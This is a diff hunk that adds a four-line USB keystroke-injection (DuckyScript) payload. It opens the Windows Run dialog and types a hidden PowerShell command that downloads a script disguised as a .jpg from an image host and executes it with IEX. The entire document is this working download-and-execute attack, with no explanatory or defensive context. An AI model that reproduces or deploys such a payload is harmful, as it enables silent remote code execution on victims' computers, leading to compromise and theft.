@@ -1,0 +1,4 @@
+GUI r
+DELAY 500
+STRING powershell -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEimKD9wvx1cXaq4MGg9zdCmmiXQ0vs40c0LPUM_iRO1nJi4JTuhCFvjFgBsy9gEeT1pRAaxnzTbD1LGcLUoSMX2XMpV53f5Wsuinl9pPo6KfNbiZwKvzg5CC2Yvffhd_yHPx37kiFaJT16v/s200/rubber.jpg')"
+ENTER
